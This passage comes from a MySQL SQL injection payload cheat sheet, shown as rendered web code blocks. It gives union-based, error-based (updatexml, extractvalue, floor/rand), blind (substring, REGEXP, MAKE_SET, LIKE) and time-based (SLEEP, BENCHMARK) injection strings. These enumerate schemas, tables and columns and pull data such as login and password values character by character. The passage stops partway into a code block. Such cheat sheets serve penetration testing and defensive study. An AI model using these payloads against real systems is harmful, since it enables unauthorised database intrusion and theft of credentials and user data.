</pre></td><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[</span><span class="n">dummydb</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">author_id</span><span class="p">,</span><span class="n">title</span> <span class="k">from</span> <span class="n">posts</span> <span class="k">where</span> <span class="n">author_id</span><span class="o">=-</span><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,(</span><span class="k">select</span> <span class="n">concat</span><span class="p">(</span><span class="nv">`3`</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="nv">`4`</span><span class="p">)</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">)</span><span class="n">a</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
<span class="o">+</span><span class="c1">-----------+-----------------------------------------------------------------+</span>
<span class="o">|</span> <span class="n">author_id</span> <span class="o">|</span> <span class="n">title</span>                                                           <span class="o">|</span>
<span class="o">+</span><span class="c1">-----------+-----------------------------------------------------------------+</span>
<span class="o">|</span>         <span class="mi">1</span> <span class="o">|</span> <span class="n">a45d4e080fc185dfa223aea3d0c371b6cc180a37</span><span class="p">:</span><span class="n">veronica80</span><span class="o">@</span><span class="n">example</span><span class="p">.</span><span class="n">org</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">-----------+-----------------------------------------------------------------+</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="mysql-error-based">MYSQL Error Based</h2>

<h3 id="mysql-error-based---basic">MYSQL Error Based - Basic</h3>

<p>Works with <code class="language-plaintext highlighter-rouge">MySQL &gt;= 4.1</code></p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="p">(</span><span class="k">select</span> <span class="mi">1</span> <span class="k">and</span> <span class="k">row</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="p">(</span><span class="k">select</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="n">concat</span><span class="p">(</span><span class="n">CONCAT</span><span class="p">(</span><span class="o">@@</span><span class="k">VERSION</span><span class="p">),</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">()</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="n">x</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">2</span><span class="p">)</span><span class="n">a</span> <span class="k">group</span> <span class="k">by</span> <span class="n">x</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">))</span>
<span class="s1">'+(select 1 and row(1,1)&gt;(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="mysql-error-based---updatexml-function">MYSQL Error Based - UpdateXML function</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="k">AND</span> <span class="n">updatexml</span><span class="p">(</span><span class="n">rand</span><span class="p">(),</span><span class="n">concat</span><span class="p">(</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">),</span><span class="k">version</span><span class="p">(),</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">)),</span><span class="k">null</span><span class="p">)</span><span class="o">-</span>
<span class="k">AND</span> <span class="n">updatexml</span><span class="p">(</span><span class="n">rand</span><span class="p">(),</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,(</span><span class="k">SELECT</span> <span class="n">concat</span><span class="p">(</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">),</span><span class="k">schema_name</span><span class="p">,</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">))</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span> <span class="k">LIMIT</span> <span class="n">data_offset</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="k">null</span><span class="p">)</span><span class="c1">--</span>
<span class="k">AND</span> <span class="n">updatexml</span><span class="p">(</span><span class="n">rand</span><span class="p">(),</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,(</span><span class="k">SELECT</span> <span class="n">concat</span><span class="p">(</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">),</span><span class="k">TABLE_NAME</span><span class="p">,</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">))</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">TABLES</span> <span class="k">WHERE</span> <span class="n">table_schema</span><span class="o">=</span><span class="n">data_column</span> <span class="k">LIMIT</span> <span class="n">data_offset</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="k">null</span><span class="p">)</span><span class="c1">--</span>
<span class="k">AND</span> <span class="n">updatexml</span><span class="p">(</span><span class="n">rand</span><span class="p">(),</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,(</span><span class="k">SELECT</span> <span class="n">concat</span><span class="p">(</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">),</span><span class="k">column_name</span><span class="p">,</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">))</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">WHERE</span> <span class="k">TABLE_NAME</span><span class="o">=</span><span class="n">data_table</span> <span class="k">LIMIT</span> <span class="n">data_offset</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="k">null</span><span class="p">)</span><span class="c1">--</span>
<span class="k">AND</span> <span class="n">updatexml</span><span class="p">(</span><span class="n">rand</span><span class="p">(),</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,(</span><span class="k">SELECT</span> <span class="n">concat</span><span class="p">(</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">),</span><span class="n">data_info</span><span class="p">,</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">))</span> <span class="k">FROM</span> <span class="n">data_table</span><span class="p">.</span><span class="n">data_column</span> <span class="k">LIMIT</span> <span class="n">data_offset</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="k">null</span><span class="p">)</span><span class="c1">--</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Shorter to read:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="s1">' and updatexml(null,concat(0x0a,version()),null)-- -
'</span> <span class="k">and</span> <span class="n">updatexml</span><span class="p">(</span><span class="k">null</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x0a</span><span class="p">,(</span><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span> <span class="k">LIMIT</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="k">null</span><span class="p">)</span><span class="c1">-- -</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="mysql-error-based---extractvalue-function">MYSQL Error Based - Extractvalue function</h3>

<p>Works with <code class="language-plaintext highlighter-rouge">MySQL &gt;= 5.1</code></p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">extractvalue</span><span class="p">(</span><span class="n">rand</span><span class="p">(),</span><span class="n">concat</span><span class="p">(</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">),</span><span class="k">version</span><span class="p">(),</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">)))</span><span class="c1">--</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">extractvalue</span><span class="p">(</span><span class="n">rand</span><span class="p">(),</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,(</span><span class="k">SELECT</span> <span class="n">concat</span><span class="p">(</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">),</span><span class="k">schema_name</span><span class="p">,</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">))</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span> <span class="k">LIMIT</span> <span class="n">data_offset</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="c1">--</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">extractvalue</span><span class="p">(</span><span class="n">rand</span><span class="p">(),</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,(</span><span class="k">SELECT</span> <span class="n">concat</span><span class="p">(</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">),</span><span class="k">TABLE_NAME</span><span class="p">,</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">))</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">TABLES</span> <span class="k">WHERE</span> <span class="n">table_schema</span><span class="o">=</span><span class="n">data_column</span> <span class="k">LIMIT</span> <span class="n">data_offset</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="c1">--</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">extractvalue</span><span class="p">(</span><span class="n">rand</span><span class="p">(),</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,(</span><span class="k">SELECT</span> <span class="n">concat</span><span class="p">(</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">),</span><span class="k">column_name</span><span class="p">,</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">))</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">WHERE</span> <span class="k">TABLE_NAME</span><span class="o">=</span><span class="n">data_table</span> <span class="k">LIMIT</span> <span class="n">data_offset</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="c1">--</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">extractvalue</span><span class="p">(</span><span class="n">rand</span><span class="p">(),</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,(</span><span class="k">SELECT</span> <span class="n">concat</span><span class="p">(</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">),</span><span class="n">data_info</span><span class="p">,</span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">126</span><span class="p">))</span> <span class="k">FROM</span> <span class="n">data_table</span><span class="p">.</span><span class="n">data_column</span> <span class="k">LIMIT</span> <span class="n">data_offset</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="c1">--</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="mysql-blind">MYSQL Blind</h2>

<h3 id="mysql-blind-with-substring-equivalent">MYSQL Blind with substring equivalent</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="k">substring</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">5</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="k">right</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">5</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="k">left</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">4</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="k">lower</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">Version</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">=</span><span class="mi">51</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="n">mid</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="k">SELECT</span> <span class="n">SUBSTR</span><span class="p">(</span><span class="k">table_name</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="o">&gt;</span> <span class="s1">'A'</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="k">SELECT</span> <span class="n">SUBSTR</span><span class="p">(</span><span class="k">column_name</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="o">&gt;</span> <span class="s1">'A'</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="mysql-blind-sql-injection-in-order-by-clause-using-a-binary-query-and-regexp">MySQL Blind SQL Injection in ORDER BY clause using a binary query and REGEXP</h3>

<p>This query basically orders by one column or the other, depending on whether the EXISTS() returns a 1 or not.
For the EXISTS() function to return a 1, the REGEXP query needs to match up, this means you can bruteforce blind values character by character and leak data from the database without direct output.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>[...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP "^[BRUTEFORCE CHAR BY CHAR].*" AND [FURTHER OPTIONS / CONDITIONS]) THEN [ONE COLUMN TO ORDER BY] ELSE [ANOTHER COLUMN TO ORDER BY] END)); -- -
</pre></td></tr></tbody></table></code></div></div>

<h3 id="mysql-blind-sql-injection-binary-query-using-regexp">MySQL Blind SQL Injection binary query using REGEXP.</h3>

<p>Payload:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -
</pre></td></tr></tbody></table></code></div></div>

<p>Would work in the query (where the “where” clause is the injection point):</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -';
</pre></td></tr></tbody></table></code></div></div>

<p>In said query, it will check to see if an item exists in the “name” column in the “items” database that starts with an “a”. If it will sleep for 3 seconds per item.</p>

<h3 id="mysql-blind-using-a-conditional-statement">MYSQL Blind using a conditional statement</h3>

<p>TRUE: <code class="language-plaintext highlighter-rouge">if @@version starts with a 5</code>:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="mi">2100935</span><span class="s1">' OR IF(MID(@@version,1,1)='</span><span class="mi">5</span><span class="s1">',sleep(1),1)='</span><span class="mi">2</span>
<span class="n">Response</span><span class="p">:</span>
<span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span> <span class="mi">500</span> <span class="n">Internal</span> <span class="n">Server</span> <span class="n">Error</span>
</pre></td></tr></tbody></table></code></div></div>

<p>False: <code class="language-plaintext highlighter-rouge">if @@version starts with a 4</code>:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="mi">2100935</span><span class="s1">' OR IF(MID(@@version,1,1)='</span><span class="mi">4</span><span class="s1">',sleep(1),1)='</span><span class="mi">2</span>
<span class="n">Response</span><span class="p">:</span>
<span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span> <span class="mi">200</span> <span class="n">OK</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="mysql-blind-with-make_set">MYSQL Blind with MAKE_SET</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="k">AND</span> <span class="n">MAKE_SET</span><span class="p">(</span><span class="n">YOLO</span><span class="o">&lt;</span><span class="p">(</span><span class="k">SELECT</span><span class="p">(</span><span class="k">length</span><span class="p">(</span><span class="k">version</span><span class="p">()))),</span><span class="mi">1</span><span class="p">)</span>
<span class="k">AND</span> <span class="n">MAKE_SET</span><span class="p">(</span><span class="n">YOLO</span><span class="o">&lt;</span><span class="n">ascii</span><span class="p">(</span><span class="k">substring</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="n">POS</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="mi">1</span><span class="p">)</span>
<span class="k">AND</span> <span class="n">MAKE_SET</span><span class="p">(</span><span class="n">YOLO</span><span class="o">&lt;</span><span class="p">(</span><span class="k">SELECT</span><span class="p">(</span><span class="k">length</span><span class="p">(</span><span class="n">concat</span><span class="p">(</span><span class="n">login</span><span class="p">,</span><span class="n">password</span><span class="p">)))),</span><span class="mi">1</span><span class="p">)</span>
<span class="k">AND</span> <span class="n">MAKE_SET</span><span class="p">(</span><span class="n">YOLO</span><span class="o">&lt;</span><span class="n">ascii</span><span class="p">(</span><span class="k">substring</span><span class="p">(</span><span class="n">concat</span><span class="p">(</span><span class="n">login</span><span class="p">,</span><span class="n">password</span><span class="p">),</span><span class="n">POS</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="mi">1</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="mysql-blind-with-like">MYSQL Blind with LIKE</h3>

<p><a href="https://www.w3resource.com/sql/wildcards-like-operator/wildcards-underscore.php">‘_’</a> acts like the regex character ‘.’, use it to speed up your blind testing</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="n">cust_code</span> <span class="k">FROM</span> <span class="n">customer</span> <span class="k">WHERE</span> <span class="n">cust_name</span> <span class="k">LIKE</span> <span class="s1">'k__l'</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="mysql-time-based">MYSQL Time Based</h2>

<p>The following SQL codes will delay the output from MySQL.</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="o">+</span><span class="n">BENCHMARK</span><span class="p">(</span><span class="mi">40000000</span><span class="p">,</span><span class="n">SHA1</span><span class="p">(</span><span class="mi">1337</span><span class="p">))</span><span class="o">+</span>
<span class="s1">'%2Bbenchmark(3200,SHA1(1))%2B'</span>
<span class="k">AND</span> <span class="p">[</span><span class="n">RANDNUM</span><span class="p">]</span><span class="o">=</span><span class="n">BENCHMARK</span><span class="p">([</span><span class="n">SLEEPTIME</span><span class="p">]</span><span class="mi">000000</span><span class="p">,</span><span class="n">MD5</span><span class="p">(</span><span class="s1">'[RANDSTR]'</span><span class="p">))</span>  <span class="o">//</span><span class="n">SHA1</span>
<span class="n">RLIKE</span> <span class="n">SLEEP</span><span class="p">([</span><span class="n">SLEEPTIME</span><span class="p">])</span>
<span class="k">OR</span> <span class="n">ELT</span><span class="p">([</span><span class="n">RANDNUM</span><span class="p">]</span><span class="o">=</span><span class="p">[</span><span class="n">RANDNUM</span><span class="p">],</span><span class="n">SLEEP</span><span class="p">([</span><span class="n">SLEEPTIME</span><span class="p">]))</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="using-sleep-in-a-subselect">Using SLEEP in a subselect</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="mi">1</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="p">(</span><span class="n">select</span><span class="w"> </span><span class="nx">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="n">dual</span><span class="w"> </span><span class="nx">where</span><span class="w"> </span><span class="nx">database</span><span class="p">()</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="s1">'%'</span><span class="p">)</span><span class="c">#</span><span class="w">
</span><span class="mi">1</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="p">(</span><span class="n">select</span><span class="w"> </span><span class="nx">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="n">dual</span><span class="w"> </span><span class="nx">where</span><span class="w"> </span><span class="nx">database</span><span class="p">()</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="s1">'___'</span><span class="p">)</span><span class="c"># </span><span class="w">
</span><span class="mi">1</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="p">(</span><span class="n">select</span><span class="w"> </span><span class="nx">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="n">dual</span><span class="w"> </span><span class="nx">where</span><span class="w"> </span><span class="nx">database</span><span class="p">()</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="s1">'____'</span><span class="p">)</span><span class="c">#</span><span class="w">
</span><span class="mi">1</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="p">(</span><span class="n">select</span><span class="w"> </span><span class="nx">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="n">dual</span><span class="w"> </span><span class="nx">where</span><span class="w"> </span><span class="nx">database</span><span class="p">()</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="s1">'_____'</span><span class="p">)</span><span class="c">#</span><span class="w">
</span><span class="mi">1</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="p">(</span><span class="n">select</span><span class="w"> </span><span class="nx">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="n">dual</span><span class="w"> </span><span class="nx">where</span><span class="w"> </span><span class="nx">database</span><span class="p">()</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="s1">'a____'</span><span class="p">)</span><span class="c">#</span><span class="w">
</span><span class="o">...</span><span class="w">
</span><span class="mi">1</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="p">(</span><span class="n">select</span><span class="w"> </span><span class="nx">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="n">dual</span><span class="w"> </span><span class="nx">where</span><span class="w"> </span><span class="nx">database</span><span class="p">()</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="s1">'s____'</span><span class="p">)</span><span class="c">#</span><span class="w">
</span><span class="mi">1</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="p">(</span><span class="n">select</span><span class="w"> </span><span class="nx">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="n">dual</span><span class="w"> </span><span class="nx">where</span><span class="w"> </span><span class="nx">database</span><span class="p">()</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="s1">'sa___'</span><span class="p">)</span><span class="c">#</span><span class="w">
</span><span class="o">...</span><span class="w">
</span><span class="mi">1</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="p">(</span><span class="n">select</span><span class="w"> </span><span class="nx">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="n">dual</span><span class="w"> </span><span class="nx">where</span><span class="w"> </span><span class="nx">database</span><span class="p">()</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="s1">'sw___'</span><span class="p">)</span><span class="c">#</span><span class="w">
</span><span class="mi">1</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="p">(</span><span class="n">select</span><span class="w"> </span><span class="nx">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="n">dual</span><span class="w"> </span><span class="nx">where</span><span class="w"> </span><span class="nx">database</span><span class="p">()</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="s1">'swa__'</span><span class="p">)</span><span class="c">#</span><span class="w">
</span><span class="mi">1</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="p">(</span><span class="n">select</span><span class="w"> </span><span class="nx">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="n">dual</span><span class="w"> </span><span class="nx">where</span><span class="w"> </span><span class="nx">database</span><span class="p">()</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="s1">'swb__'</span><span class="p">)</span><span class="c">#</span><span class="w">
</span><span class="mi">1</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="p">(</span><span class="n">select</span><span class="w"> </span><span class="nx">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="n">dual</span><span class="w"> </span><span class="nx">where</span><span class="w"> </span><span class="nx">database</span><span class="p">()</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="s1">'swi__'</span><span class="p">)</span><span class="c">#</span><span class="w">
</span><span class="o">...</span><span class="w">
</span><span class="mi">1</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="p">(</span><span class="n">select</span><span class="w"> </span><span class="nx">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="n">dual</span><span class="w"> </span><span class="nx">where</span><span class="w"> </span><span class="p">(</span><span class="n">select</span><span class="w"> </span><span class="nx">table_name</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">information_schema.columns</span><span class="w"> </span><span class="nx">where</span><span class="w"> </span><span class="nx">table_schema</span><span class="o">=</span><span class="n">database</span><span class="p">()</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="nx">column_name</span><span class="w"> </span><span class="nx">like</span><span class="w"> </span><span class="s1">'%pass%'</span><span class="w"> </span><span class="nx">limit</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="nx">1</span><span class="p">)</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="s1">'%'</span><span class="p">)</span><span class="c">#</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="using-conditional-statements">Using conditional statements</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
